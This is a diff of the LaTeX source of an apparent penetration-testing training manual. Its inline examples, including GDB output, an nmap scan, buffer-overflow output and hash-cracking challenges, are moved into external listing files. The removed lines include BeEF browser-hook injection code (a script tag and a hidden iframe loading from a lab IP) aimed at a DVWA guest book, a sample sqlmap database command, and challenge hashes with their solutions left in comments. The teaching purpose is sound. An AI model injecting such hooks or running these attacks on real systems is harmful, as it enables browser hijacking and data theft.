@@ -247,7 +247,7 @@
 							\centering
 							\begin{tabular}{| l | l | l |}
 								\hline
-								\textbf{Bit} &  \textbf{Label} &   \textbf{Description} \\\hline 
+								\textbf{Bit} &  \textbf{Label} &   \textbf{Description} \\\hline
 								0   &   CF &     Carry flag \\ \hline
 								2   &   PF   &   Parity flag \\ \hline
 								4   &   AF   &   Auxiliary carry flag \\ \hline
@@ -273,50 +273,8 @@
 				
 				To see this in action, write a simple program to print ``Hello World'' ten times in C (an example of such a program can be found in the programming section), %TODO: reference this
 				compile it with ``gcc -g <src>'' and run the following in GDB: (I also recommend the peda\footnote{\url{https://github.com/longld/peda}} extension to GDB for it's visualization functions)				
-				\begin{verbatim}
-					$gdb -q a.out
-					Reading symbols from a.out...
-					Reading symbols from 
-					~/src/a.out.dSYM/Contents/Resources/DWARF/a.out...done.
-					done.
-
-					gdb-peda$ break main
-					Breakpoint 1 at 0x100000eff: file a.c, line 5.
-
-					gdb-peda$ run
-					Starting program: /Users/Jarrah/src/a.out
-					Warning: not running or target is remote
-
-					Breakpoint 1, main () at a.c:5
-					5		int i = 0;
-
-					gdb-peda$ i r
-					rax            0x100000ef0	0x100000ef0
-					rbx            0x0	0x0
-					rcx            0x7fff5fbffc80	0x7fff5fbffc80
-					rdx            0x7fff5fbffbb8	0x7fff5fbffbb8
-					rsi            0x7fff5fbffba8	0x7fff5fbffba8
-					rdi            0x1	0x1
-					rbp            0x7fff5fbffb80	0x7fff5fbffb80
-					rsp            0x7fff5fbffb70	0x7fff5fbffb70
-					r8             0x0	0x0
-					r9             0x7fff785350c8	0x7fff785350c8
-					r10            0xffffffff	0xffffffff
-					r11            0xffffffff0X00	0xffffffff00000000
-					r12            0x0	0x0
-					r13            0x0	0x0
-					r14            0x0	0x0
-					r15            0x0	0x0
-					rip            0x100000eff	0x100000eff <main+15>
-					eflags         0x202	[ IF ]
-					cs             0x2b	0x2b
-					ss             <unavailable>
-					ds             <unavailable>
-					es             <unavailable>
-					fs             0x0	0x0
-					gs             0x0	0x0
-
-				\end{verbatim}
+				%TODO: This still formats like shit. 
+				\lstinputlisting[numbers=none]{./shellOut/GDBHelloWorld.out}
 				In the above, we set a break point in main() (``break main'' or ``b main''), right before our code was executed. 
 				This allows us to run the program, pausing it to view how the CPU is executing the code. 
 				The command ``info registers'' or ``i r'' was then used to show what the registers of the CPU held at the time.
@@ -839,39 +797,7 @@
 			This will output all of the services which are found to be running on the remote system. 
 			A sample output of an nmap SYN scan can be seen below. 
 			Note that this is an exaggerated response, as the target scanned was intentionally vulnerable. 
-			\begin{verbatim}
-				Starting Nmap 7.01 (https://nmap.org ) at 2016-01-17 00:56 EST
-				Nmap scan report for 192.168.115.129
-				Host is up (0.000099s latency).
-				Not shown: 977 closed ports
-				PORT     STATE SERVICE
-				21/tcp   open  ftp
-				22/tcp   open  ssh
-				23/tcp   open  telnet
-				25/tcp   open  smtp
-				53/tcp   open  domain
-				80/tcp   open  http
-				111/tcp  open  rpcbind
-				139/tcp  open  netbios-ssn
-				445/tcp  open  microsoft-ds
-				512/tcp  open  exec
-				513/tcp  open  login
-				514/tcp  open  shell
-				1099/tcp open  rmiregistry
-				1524/tcp open  ingreslock
-				2049/tcp open  nfs
-				2121/tcp open  ccproxy-ftp
-				3306/tcp open  mysql
-				5432/tcp open  postgresql
-				5900/tcp open  vnc
-				6000/tcp open  X11
-				6667/tcp open  irc
-				8009/tcp open  ajp13
-				8180/tcp open  unknown
-				MAC Address: 00:0C:29:92:21:5E (VMware)
-	
-				Nmap done: 1 IP address (1 host up) scanned in 13.38 seconds
-			\end{verbatim}
+			\lstinputlisting[numbers=none]{./shellOut/nmapSYN.out}
 		\subsection{Other Scan Types}
 			While SYN scanning is useful, it has become easier to detect due to the introduction of IPS with partial connection rules. 
 			These systems will see a number of partial connections within a given time and will lock out the address that the connections came from, effectively halting your scan. 
@@ -1153,7 +1079,7 @@
 			\centering
 			\begin{tabular}{| l | l |}
 				\hline
-				-L & The listening host. Omitted unless listening on a specific adaptor.\\ \hline 
+				-L & The listening host. Omitted unless listening on a specific adaptor.\\ \hline
 				-l & The local port to listen on. Connections here will be forwarded. \\ \hline
 				-p & TCP port to forward connections to. \\ \hline
 				-r & The IP address the connection is relayed to. \\ \hline
@@ -1357,13 +1283,7 @@
 				Before you can do anything with BeEF, you will have to hook a browser. 
 				To do this, you will first have to find a vulnerable page such as the guest book on DVWA. 
 				At this point, you will want to embed the BeEF hook script into the page with a command such as the following:
-				\begin{verbatim}
-					<script src= “http://192.168.31.20:3000/hook.js&#8221;  
-type= "text/javascript" ></script>
-					or
-					<iframe height=0 width=0 
-src=http://192.168.31.21:3000/demos/basic.html></iframe>
-				\end{verbatim}
+				\lstinputlisting[numbers=none]{./shellOut/BeefHook.in}
 				If you set this up correctly, the victim will have to do nothing more than access the page to be hooked. 
 				No clicking or other intervention is required. 
 			\subsubsection{Attacking}
@@ -1447,11 +1367,7 @@ src=http://192.168.31.21:3000/demos/basic.html></iframe>
 				This option (``-d'') will connect directly do a database which is running on the server. 
 				This gives you significantly more power than connecting through an injectable web site, but it can only be done after you have found the credentials through other means. 
 				SQLmap will accept a connection string in either of the following forms:
-				\begin{verbatim}
-DBMS://<USER>:<PASSWORD>@<DB IP>:<DB PORT>/<DATABASE NAME>
-or
-DBMS://<DATABASE FILE PATH>
-				\end{verbatim}
+				\lstinputlisting[numbers=none]{./shellOut/SQLmapDBConnection.in}
 				For example, the following command will output the DBMS banner, all databases and all DBMS users as well as fingerprinting the database. 
 				\begin{quote}
 					sqlmap -d "mysql://admin:admin@192.168.21.17:3306/testdb" -f --banner --dbs --users
@@ -2675,16 +2591,16 @@ list = ['one', 'two', 'three'];
 				\centering
 				\begin{tabular}{| l | p{8cm} |}
 					\hline
-					\textbf{Type} & \textbf{Explanation} \\ \hline 
-					char & A single byte used to store an ASCII character \\ \hline \hline
+					\textbf{Type} & \textbf{Explanation} \\ \hline
+					char & A single byte used to store an ASCII character \\ \hline\hline
 					short & An integer at least 16 bits in size. \\ \hline
 					int & An integer at least 16 bits in size. \\ \hline
 					long & An integer of at least 32 bits in size. \\ \hline
-					long long & An integer of at least 64 bits in size. \\ \hline \hline
+					long long & An integer of at least 64 bits in size. \\ \hline\hline
 					float & A precision floating point (decimal) number. \\ \hline
 					double & A double precision floating point number. \\ \hline
 					long double & An extended precision floating point number. 
-					May be the same as a double if the extended precision is not supported. \\ \hline 
+					May be the same as a double if the extended precision is not supported. \\ \hline
 				\end{tabular}
 				\caption{C Variable Types}
 				\label{tab:CVariableTypes}
@@ -2844,7 +2760,7 @@ list = ['one', 'two', 'three'];
 				\centering
 				\begin{tabular}{| l | p{8cm} |}
 					\hline
-					\textbf{Code term} & \textbf{Explanation} \\ \hline 
+					\textbf{Code term} & \textbf{Explanation} \\ \hline
 					type *ptr & Create a pointer of name ptr. \\ \hline
 					*ptr & The value of whatever ptr is pointing at. \\ \hline
 					*(ptr + i) & The value of whatever ptr is pointed at plus i. \\ \hline
@@ -3334,7 +3250,7 @@ list = ['one', 'two', 'three'];
 						?u & ABCDEFGHIJKLMNOPQRSTUVWXYZ \\ \hline
 						?d & 0123456789 \\ \hline
 						?s & <space>!"\#\$\%\&\verb!'()*+,-./:;<=>?@[\]\^_`{|}~}! \\ \hline
-						%?s & Special Characters \\ \hline %TODO: Have this print the characters. 
+						%?s & Special Characters \\ \hline%TODO: Have this print the characters. 
 						?a & \verb+?l?u?d?s+ \\ \hline
 						?b & 0x00 - 0xff \\ \hline
 					\end{tabular}
@@ -3453,12 +3369,7 @@ list = ['one', 'two', 'three'];
 				head -n 20 /usr/share/wordlists/rockyou.txt
 			\end{quote}
 			The password, hashed in MD5 and SHA256 can be found below. 
-			\begin{verbatim}
-				MD5: 
-				4aa6dea37dec500f58bb241404471981
-				SHA256: 
-				6ff13e15281e9953d2c85c86e3727ea1cf3862f44d5cf18961811d63eebce2da 
-			\end{verbatim}
+			\lstinputlisting[numbers=none,firstline=1,lastline=4]{./shellOut/hashChallenges.data}
 			While you can complete this in any way you like, I recommend either using John's rules, or creating a custom word list and using Hashcat's hybird mode. 
 			%Solution: "N1c0l3;7"
 
@@ -3466,18 +3377,14 @@ list = ['one', 'two', 'three'];
 			Through an image captured when the hash was pulled, it was determined that the only keys pressed were ``2, 4, 9 and 0''. 
 			The password was also determined to be exactly 16 characters long. 
 			Create a custom mask for Hashcat and solve this sha256 hash. 
-			\begin{verbatim}
-				27e4c844657fee60da199ccb1b60c0f4072370633b1a6e831141dbf9ab4e6b01
-			\end{verbatim}
+			\lstinputlisting[numbers=none,firstline=6,lastline=6]{./shellOut/hashChallenges.data}
 			%solution: "2490092442902942"
 
 			The third challenge is based on using multiple dictionary words. 
 			This is a common method used to create passwords. 
 			I recommending using Hashcat in combinator mode to solve this SHA256 hash. 
 			All the words necessary to solve this can be found in the rockyou word-list. 
-			\begin{verbatim}
-				2fb26990a2b7d9ba876668c0ed6c9e9006313286ae02e7224e18939833fb9096
-			\end{verbatim}
+			\lstinputlisting[numbers=none,firstline=8,lastline=8]{./shellOut/hashChallenges.data}
 \chapter{System Hardening}
 	\label{ch:SystemHardening}
 	Securing one's own operating system and the software within can be a daunting task. 
@@ -4253,17 +4160,7 @@ list = ['one', 'two', 'three'];
 			On reading the above code in \ref{code:OverflowSimple} you should notice the unbounded copy of anything given as the first argument into the second buffer. 
 			This means that if you pass more than 8 bytes to the program, it will copy them into second\footnote{This will not work on OS X or a well secured Linux system due to buffer bounds checking}, overwriting anything beyond the its allocated memory. 
 			For example:
-			\begin{verbatim}
-				$./a.out bufferingALongStringaaaaaaaaaaaa
-				[PREOVERFLOW] first at 0x7fff14ac09d0, containing first
-				[PREOVERFLOW] second at 0x7fff14ac09c0, containing second
-				[ACTION] copying 32 bytes into second
-				[POSTOVERFLOW] first now contains ringaaaaaaaaaaaa
-				[POSTOVERFLOW] second now contains 
-				bufferingALongStringaaaaaaaaaaaa
-				[POSTOVERFLOW] change is at 0x7fff14ac09dc 
-				containing 1633771873 or 0x0861616161
-			\end{verbatim}
+			\lstinputlisting[numbers=none,firstline=1,lastline=9]{./shellOut/bufOver.out}
 			Note that here we altered the content of first by writing to second. 
 			This is because each item on the stack is placed at a lower memory location than the item before it. 
 			Writing beyond an items bounds will overwrite variables stored in higher memory locations. 
@@ -4278,33 +4175,7 @@ list = ['one', 'two', 'three'];
 			each function call within a program adds a frame to the stack and each return call follows a pointer back to the instructions that the call was made from. 
 			As this pointer lies at the highest memory location in the current stack frame, it is vulnerable to be overwritten through the overflow exploit discussed above. 
 			To determine it's location, open GDB on code example \ref{code:OverflowChallenge} and run the command ``dissass main'', which will show you the assembly code of main. 
-		\begin{Verbatim}[commandchars=\\\{\}]
-Dump of assembler code for function main:
-0x0000000100000ed0 <+0>:  push rbp
-0x0000000100000ed1 <+1>:  mov rbp,rsp
-0x0000000100000ed4 <+4>:  sub  rsp,0x20
-0x0000000100000ed8 <+8>:  mov  DWORD PTR [rbp-0x4],0x0
-0x0000000100000edf <+15>: mov DWORD PTR [rbp-0x8],edi
-0x0000000100000ee2 <+18>: mov QWORD PTR [rbp-0x10],rsi
-0x0000000100000ee6 <+22>: mov rsi,QWORD PTR [rbp-0x10]
-\textbf{0x0000000100000eea <+26>: mov rdi,QWORD PTR [rsi+0x8]}
-\textbf{0x0000000100000eee <+30>: call 0x100000e40 <checkAuth>}
-0x0000000100000ef3 <+35>: cmp eax,0x0
-0x0000000100000ef8 <+40>: je 0x100000f14 <main+68>
-0x0000000100000efe <+46>: lea rdi,[rip+0x6f]        
-0x0000000100000f05 <+53>: mov al,0x0
-0x0000000100000f07 <+55>: call 0x100000f3a
-0x0000000100000f0c <+60>: mov DWORD PTR [rbp-0x14],eax
-0x0000000100000f0f <+63>: jmp 0x100000f25 <main+85>
-0x0000000100000f14 <+68>: lea rdi,[rip+0x68]        
-0x0000000100000f1b <+75>: mov al,0x0
-0x0000000100000f1d <+77>: call 0x100000f3a
-0x0000000100000f22 <+82>: mov DWORD PTR [rbp-0x18],eax
-0x0000000100000f25 <+85>: xor eax,eax
-0x0000000100000f27 <+87>: add rsp,0x20
-0x0000000100000f2b <+91>: pop rbp
-0x0000000100000f2c <+92>: ret
-		\end{Verbatim}
+			\lstinputlisting[numbers=none,firstline=11,lastline=27]{./shellOut/bufOver.out}
 		The two bold lines show the return address being calculated and the call to the checkAuth function. %TODO: Add a test to use ShellcodeData.asm 
 		\subsection{Heap Based Overflows}
 		
@@ -4838,7 +4709,7 @@ Dump of assembler code for function main:
 					\keys{\ctrl + D} & Log out of the current shell session, equal to typing ``exit'' or ``logout''. \\ \hline
 					\keys{\ctrl + E} & Move the cursor to the end of the line. \\ \hline
 					\keys{\ctrl + H} & Generate a backspace character. \\ \hline
-					\keys{\ctrl + L} & Clear the terminal. Equivalent to typing ``clear''. \\ \hline 
+					\keys{\ctrl + L} & Clear the terminal. Equivalent to typing ``clear''. \\ \hline
 					\keys{\ctrl + R} & Search command history. \\ \hline
 					\keys{\ctrl + Z} & Suspend a program. \\ \hline
 					\keys{\arrowkeyright} or \keys{\arrowkeyleft} & Move the cursor one place on the current line. \\ \hline
@@ -4876,24 +4747,24 @@ Dump of assembler code for function main:
 					cp <src> <dest> & Copy src to dest. \\ \hline
 					df & Reports disk usage. \\ \hline
 					echo <string> & Print string to STDOUT. \\ \hline
-					export & A bash internal that adds to environmental variables. \\ \hline 
-					file & Determine the type of a file. \\ \hline 
+					export & A bash internal that adds to environmental variables. \\ \hline
+					file & Determine the type of a file. \\ \hline
 					find <path> <expression> & find files within the file system. \\ \hline
 					grep <pattern> [file] & Print only lines which match pattern. 
-											If file given, search it, otherwise search STDIN \\ \hline. 
-					head <file> & Print the top of file. \\ \hline 
-					id & Prints real and effective user names and IDs. \\ \hline. 
+											If file given, search it, otherwise search STDIN \\ \hline 
+					head <file> & Print the top of file. \\ \hline
+					id & Prints real and effective user names and IDs. \\ \hline 
 					info <command> & Basic documentation about a command. \\ \hline
 					less [file] & View a file or STDIN with a pager. \\ \hline
 					ln <target> <name> & create a link to target named name. 
-										use ``-s'' for simlink. \\ \hline. 
+										use ``-s'' for simlink. \\ \hline 
 					locate <string> & Search the file database for string. \\ \hline
-					ls & Prints directory content. \\ \hline. 
+					ls & Prints directory content. \\ \hline 
 					man <command> & Use the system pager to read the manual for command. \\ \hline
 					mkdir <name> & Make a new directory named name. \\ \hline
 					mv <src> <dest> & Move src to dest. \\ \hline
 					newgrp <name> & Log into a new group. \\ \hline
-					pwd & Print the current working directory. \\ \hline. 
+					pwd & Print the current working directory. \\ \hline 
 					quota & Show disk usage and limits. \\ \hline
 					rm <file> & Delete files or directories. 
 								Directories will only be deleted with the ``-r flag''. \\ \hline
@@ -4915,10 +4786,10 @@ Dump of assembler code for function main:
 					\hline
 					\textbf{Character} & \textbf{Use} \\ \hline
 					\$(<command>) & Run command and replace the block with it's output. \\ \hline
-					\verb+`+<command>\verb+`+  & As for \$ \\ \hline 
-					<command1> | <command2> & Send STDOUT of command1 to STDIN. \\ \hline 
+					\verb+`+<command>\verb+`+  & As for \$ \\ \hline
+					<command1> | <command2> & Send STDOUT of command1 to STDIN. \\ \hline
 					<command> > <file> & Send STDOUT of command to file. \\ \hline
-					<command> < <file> & Send file to command as STDIN. \\ \hline 
+					<command> < <file> & Send file to command as STDIN. \\ \hline
 				\end{tabular}
 				\label{tab:SpecialCommands}
 				\caption{Linux Commandline Special Characters}
@@ -5025,9 +4896,10 @@ Dump of assembler code for function main:
 			\subsubsection{File System Structure}
 			\begin{quote}%TODO: This is horrid. Find a better way. 
 				\begin{quote}
+				\framebox{\parbox{\dimexpr\linewidth-2\fboxsep-2\fboxrule}{\itshape%
 				This section is an in-depth discussion on how a Linux filesystem works.
 				Feel free to skip it, as it has little use in working with Linux. 
-				However, it can become important when trying to diagnose issues with it.
+				However, it can become important when trying to diagnose issues with it.}}
 				\end{quote}
 			\end{quote}
 				
